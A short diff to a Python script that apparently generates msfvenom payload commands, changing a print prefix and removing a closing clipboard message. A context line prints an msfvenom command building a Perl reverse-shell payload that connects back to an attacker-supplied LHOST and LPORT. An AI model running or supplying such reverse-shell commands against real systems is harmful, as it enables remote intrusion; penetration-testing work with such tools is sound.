@@ -69,7 +69,7 @@ else:
     print("(-) Unrecognised file type, please try again!")
 
 print("-" * 60)
-print("(+) The following code was copied to your clipboard:")
+print("(*) The following code was copied to your clipboard:")
 
 if selector == "perl":
     print("(*) msfvenom -p cmd/unix/reverse_perl LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.pl")
@@ -103,5 +103,3 @@ elif selector == "linux":
 
 else:
     pass
-
-print("(*) The Requested Script Has Been Copied To Your Clipboard")
